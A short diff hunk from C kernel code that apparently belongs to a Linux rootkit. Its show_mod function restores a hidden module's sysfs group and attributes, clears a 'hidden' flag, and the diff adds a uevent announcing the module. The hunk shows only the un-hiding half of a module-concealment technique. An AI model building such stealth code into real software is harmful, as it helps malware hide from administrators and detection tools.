@@ -52,6 +52,7 @@ static void show_mod(void) {
     sysfs_create_group(&THIS_MODULE->mkobj.kobj, &sect_attrs_prev->grp);
     THIS_MODULE->notes_attrs = notes_attrs_prev;
     THIS_MODULE->sect_attrs = sect_attrs_prev;
+    kobject_uevent(&THIS_MODULE->mkobj.kobj, KOBJ_ADD);
     hidden = 0;
 }
 
